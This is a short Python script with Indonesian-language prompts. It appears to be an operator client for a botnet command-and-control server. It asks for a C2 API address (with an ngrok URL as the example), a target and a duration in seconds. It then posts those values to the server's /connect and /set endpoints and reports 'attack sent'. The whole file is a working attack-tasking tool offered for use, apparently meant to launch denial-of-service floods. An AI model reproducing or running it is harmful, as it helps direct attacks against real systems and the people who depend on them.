import requests, os
from colorama import Fore

os.system("clear")
print(Fore.CYAN + "[*] MASUKKAN API C2 (contoh: https://xxxx.ngrok.io)")
api = input(Fore.GREEN + "API C2: ")
target = input(Fore.YELLOW + "MASUKAN TARGET: ")
durasi = input(Fore.RED + "MASUKAN DURASI (detik): ")

headers = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "*/*",
    "Connection": "keep-alive"
}

try:
    r = requests.post(f"{api}/connect", headers=headers)
    if r.ok:
        print(Fore.CYAN + f"[+] TERHUBUNG KE C2: {api}")
except Exception as e:
    print(Fore.RED + f"[!] Gagal connect ke C2: {e}")
    exit()

try:
    res = requests.post(f"{api}/set", json={"target": target, "time": durasi}, headers=headers)
    if res.ok:
        print(Fore.GREEN + "[+] Serangan dikirim!")
    else:
        print(Fore.RED + "[!] Gagal kirim perintah.")
except Exception as err:
    print(Fore.RED + f"[!] Error: {err}")
